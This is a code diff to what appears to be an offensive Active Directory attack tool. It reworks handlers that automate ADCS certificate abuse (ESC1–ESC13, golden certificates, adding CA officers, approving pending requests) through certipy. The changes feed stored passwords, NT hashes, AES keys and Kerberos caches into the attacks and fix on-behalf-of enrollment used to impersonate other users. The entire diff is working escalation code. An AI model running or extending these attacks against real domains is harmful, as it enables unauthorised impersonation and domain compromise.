@@ -117,25 +117,93 @@ def _resolve_adcs_impersonation_target(
     return (str(fallback).split("@", 1)[0], sid)
 
 
-def _resolve_adcs_target_host(
-    handler: BaseEdgeHandler,
-) -> tuple[str, str | None]:
-    """Pick the ``-target`` host (FQDN preferred) and an optional ``-target-ip``.
+def _certipy_auth_args(
+    handler: BaseEdgeHandler, principal: str | None = None,
+) -> list[str]:
+    """Build certipy-compatible auth for *principal* (config user by default).
 
-    certipy uses ``-target`` for the RPC connection to the CA.  Passing
-    a bare IP makes certipy fall back to NETBIOS resolution which times
-    out on most networks; passing the FQDN with ``-target-ip <IP>``
-    bypasses DNS resolution entirely.
-
-    Returns ``(target, target_ip_or_None)``.  When ``dc_fqdn`` is unset,
-    we pass the IP as ``target`` and ``None`` as ``target_ip`` (same
-    behaviour as before this change).
+    The ADCS handlers previously used ``handler._get_auth_args()`` which emits
+    **bloodyAD**-style flags (``-u user -p :nt``); certipy needs
+    ``-u user@domain -hashes :nt -dc-ip`` (see :func:`build_certipy_auth`).
     """
+    from pathstrike.tools.certipy_wrapper import build_certipy_auth
+
+    domain = handler.config.domain.name
+    dc_ip = handler.config.domain.dc_host
+    user = principal or handler.config.credentials.username
+    cred = handler.cred_store.get_best_credential(user, domain)
+    if cred is not None:
+        return build_certipy_auth(
+            domain, user,
+            password=cred.value if cred.cred_type == CredentialType.password else None,
+            nt_hash=cred.value if cred.cred_type == CredentialType.nt_hash else None,
+            aes_key=cred.value if cred.cred_type == CredentialType.aes_key else None,
+            ccache_path=cred.value if cred.cred_type == CredentialType.ccache else None,
+            dc_ip=dc_ip,
+        )
+    cfg = handler.config.credentials
+    return build_certipy_auth(
+        domain, user, password=cfg.password, nt_hash=cfg.nt_hash,
+        aes_key=getattr(cfg, "aes_key", None),
+        ccache_path=getattr(cfg, "ccache_path", None), dc_ip=dc_ip,
+    )
+
+
+def _resolve_via_dc_dns(hostname: str, dc_ip: str) -> str | None:
+    """Resolve *hostname* to an IPv4 address using the DC as the nameserver.
+
+    The attacker box usually can't resolve the AD domain's DNS (no
+    ``/etc/hosts`` entry, system resolver points elsewhere), but the DC *is*
+    the domain's DNS server.  Returns ``None`` on any failure.
+    """
+    try:
+        import dns.resolver
+
+        resolver = dns.resolver.Resolver(configure=False)
+        resolver.nameservers = [dc_ip]
+        resolver.lifetime = 5
+        answer = resolver.resolve(hostname, "A")
+        return str(answer[0])
+    except Exception:
+        return None
+
+
+def _resolve_adcs_target_host(
+    handler: BaseEdgeHandler, edge: EdgeInfo | None = None,
+) -> tuple[str, str | None]:
+    """Pick the ``-target`` host (the **CA server**) and an optional ``-target-ip``.
+
+    certipy's ``req`` / ``ca`` / ``template`` RPC connects to the **CA host**,
+    which is frequently a member server (e.g. ``braavos``), NOT the DC.  The
+    earlier version always returned the DC, so enrollment failed with
+    "Failed to get DCE RPC connection" on any CA not co-located with the DC.
+
+    Resolution:
+    * CA host FQDN — edge ``ca_host`` / ``dnshostname`` / ``hostname`` property
+      (populated from BloodHound's ``EnterpriseCA.dnshostname`` by the ADCS
+      discovery / campaign step), else the DC FQDN as a fallback.
+    * IP — an explicit ``ca_ip`` property, else resolved from the CA FQDN via
+      the DC's DNS (so we need no ``/etc/hosts`` entry), else the DC IP when
+      the CA *is* the DC.
+
+    Returns ``(target, target_ip_or_None)``.
+    """
+    props = _extract_edge_props(edge) if edge is not None else {}
     dc_fqdn = handler.config.domain.dc_fqdn
     dc_host = handler.config.domain.dc_host
-    if dc_fqdn:
-        return (dc_fqdn, dc_host)
-    return (dc_host, None)
+
+    ca_host = (
+        props.get("ca_host") or props.get("ca_dnshostname")
+        or props.get("dnshostname") or props.get("hostname")
+        or dc_fqdn or dc_host
+    )
+    ca_ip = props.get("ca_ip") or props.get("ca_target_ip")
+    if not ca_ip:
+        if ca_host in (dc_fqdn, dc_host):
+            ca_ip = dc_host
+        else:
+            ca_ip = _resolve_via_dc_dns(ca_host, dc_host)
+    return (ca_host, ca_ip)
 
 
 def _make_cert_credential(
@@ -303,10 +371,10 @@ class ADCSESC1Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -404,10 +472,10 @@ class ADCSESC3Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -454,15 +522,22 @@ class ADCSESC3Handler(BaseEdgeHandler):
             target_user, target_template,
             f" SID='{target_sid}'" if target_sid else "",
         )
-        # Build auth args using the agent certificate
-        agent_auth = ["-pfx", agent_pfx]
+        # On-behalf-of needs BOTH the requester's connection auth
+        # (-u/-hashes/-dc-ip) AND the enrollment-agent cert (-pfx) used to
+        # sign the CMC request.  Passing only -pfx drops the connection auth
+        # and certipy silently issues nothing.
+        agent_auth = list(auth_args) + ["-pfx", agent_pfx]
+        # certipy wants the NetBIOS domain for -on-behalf-of, not the FQDN
+        # ("Domain part of '-on-behalf-of' should not be a FQDN" → the CA
+        # policy module then denies the request).
+        netbios = domain.split(".")[0]
         obo_result = await certipy_request(
             target=target_host,
             target_ip=target_ip,
             ca=ca_name,
             template=target_template,
             auth_args=agent_auth,
-            on_behalf_of=f"{domain}\\{target_user}",
+            on_behalf_of=f"{netbios}\\{target_user}",
             sid=target_sid,
         )
 
@@ -541,10 +616,14 @@ class ADCSESC4Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
+        # Template read/write is an LDAP op against the DC — NOT the CA host
+        # (req/enroll uses the CA host).  Use the DC FQDN + IP here.
+        ldap_host = self.config.domain.dc_fqdn or dc_host
+        ldap_ip = dc_host
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -568,8 +647,8 @@ class ADCSESC4Handler(BaseEdgeHandler):
             template_name,
         )
         mod_result = await certipy_template(
-            target=target_host,
-            target_ip=target_ip,
+            target=ldap_host,
+            target_ip=ldap_ip,
             template=template_name,
             auth_args=auth_args,
             save_old=True,
@@ -632,8 +711,8 @@ class ADCSESC4Handler(BaseEdgeHandler):
         )
         if self._old_config_path:
             restore_result = await certipy_template(
-                target=target_host,
-                target_ip=target_ip,
+                target=ldap_host,
+                target_ip=ldap_ip,
                 template=template_name,
                 auth_args=auth_args,
                 save_old=False,
@@ -722,10 +801,10 @@ class ADCSESC6Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -828,10 +907,10 @@ class ADCSESC9Handler(BaseEdgeHandler):
     ) -> tuple[bool, str, list[Credential]]:
         source_user = self._resolve_principal(edge)
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1003,10 +1082,10 @@ class ADCSESC10Handler(BaseEdgeHandler):
     ) -> tuple[bool, str, list[Credential]]:
         source_user = self._resolve_principal(edge)
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1172,10 +1251,10 @@ class ADCSESC13Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         source_user = self._resolve_principal(edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1283,10 +1362,10 @@ class ADCSESC2Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1396,10 +1475,10 @@ class ADCSESC5Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        default_target_host, default_target_ip = _resolve_adcs_target_host(self)
+        default_target_host, default_target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1510,10 +1589,10 @@ class ADCSESC7Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        target_host, target_ip = _resolve_adcs_target_host(self)
+        target_host, target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1706,10 +1785,10 @@ class ADCSESC8Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        default_target_host, default_target_ip = _resolve_adcs_target_host(self)
+        default_target_host, default_target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1824,10 +1903,10 @@ class ADCSESC11Handler(BaseEdgeHandler):
         self, edge: EdgeInfo, dry_run: bool = False
     ) -> tuple[bool, str, list[Credential]]:
         target_user, target_sid = _resolve_adcs_impersonation_target(self, edge)
-        default_target_host, default_target_ip = _resolve_adcs_target_host(self)
+        default_target_host, default_target_ip = _resolve_adcs_target_host(self, edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args()
+        auth_args = _certipy_auth_args(self)
         props = _extract_edge_props(edge)
 
         ca_name = props.get("ca_name") or props.get("caname", "UNKNOWN-CA")
@@ -1911,7 +1990,7 @@ class GoldenCertHandler(BaseEdgeHandler):
         target = self._resolve_target(edge)
         dc_host = self._get_dc_host()
         domain = self._get_domain()
-        auth_args = self._get_auth_args(principal)
+        auth_args = _certipy_auth_args(self, principal)
 
         # Extract CA name from target node
         ca_name = target
@@ -1967,8 +2046,11 @@ class ManageCAHandler(BaseEdgeHandler):
     ) -> tuple[bool, str, list[Credential]]:
         principal = self._resolve_principal(edge)
         target = self._resolve_target(edge)
-        dc_host = self._get_dc_host()
-        auth_args = self._get_auth_args(principal)
+        # certipy `ca` (add-officer / enable-template) is an ICertAdmin RPC to
+        # the **CA host**, not the DC.
+        ca_host, ca_ip = _resolve_adcs_target_host(self, edge)
+        ca_target = ["-target", ca_host] + (["-target-ip", ca_ip] if ca_ip else [])
+        auth_args = _certipy_auth_args(self, principal)
 
         ca_name = target
 
@@ -1981,7 +2063,7 @@ class ManageCAHandler(BaseEdgeHandler):
         self.logger.info("Adding %s as officer on CA %s", principal, ca_name)
         result = await run_certipy(
             "ca",
-            ["-ca", ca_name, "-add-officer", principal, "-target", dc_host] + auth_args,
+            ["-ca", ca_name, "-add-officer", principal] + ca_target + auth_args,
         )
 
         if not result["success"]:
@@ -1991,7 +2073,7 @@ class ManageCAHandler(BaseEdgeHandler):
         self.logger.info("Enabling SubCA template on %s", ca_name)
         result = await run_certipy(
             "ca",
-            ["-ca", ca_name, "-enable-template", "SubCA", "-target", dc_host] + auth_args,
+            ["-ca", ca_name, "-enable-template", "SubCA"] + ca_target + auth_args,
         )
 
         if not result["success"]:
@@ -2041,9 +2123,11 @@ class ManageCertificatesHandler(BaseEdgeHandler):
     ) -> tuple[bool, str, list[Credential]]:
         principal = self._resolve_principal(edge)
         target = self._resolve_target(edge)
-        dc_host = self._get_dc_host()
+        # certipy `req` and `ca -issue-request` both target the CA host, not the DC.
+        ca_host, ca_ip = _resolve_adcs_target_host(self, edge)
+        ca_target = ["-target", ca_host] + (["-target-ip", ca_ip] if ca_ip else [])
         domain = self._get_domain()
-        auth_args = self._get_auth_args(principal)
+        auth_args = _certipy_auth_args(self, principal)
 
         ca_name = target
 
@@ -2060,7 +2144,8 @@ class ManageCertificatesHandler(BaseEdgeHandler):
         # Step 1: Request a certificate (will be pending if manager approval required)
         self.logger.info("Requesting certificate from %s", ca_name)
         req_result = await certipy_request(
-            target=dc_host,
+            target=ca_host,
+            target_ip=ca_ip,
             ca=ca_name,
             template="User",
             auth_args=auth_args,
@@ -2078,8 +2163,8 @@ class ManageCertificatesHandler(BaseEdgeHandler):
                 self.logger.info("Approving request %s on %s", request_id, ca_name)
                 approve_result = await run_certipy(
                     "ca",
-                    ["-ca", ca_name, "-issue-request", request_id,
-                     "-target", dc_host] + auth_args,
+                    ["-ca", ca_name, "-issue-request", request_id]
+                    + ca_target + auth_args,
                 )
                 if approve_result["success"]:
                     return (
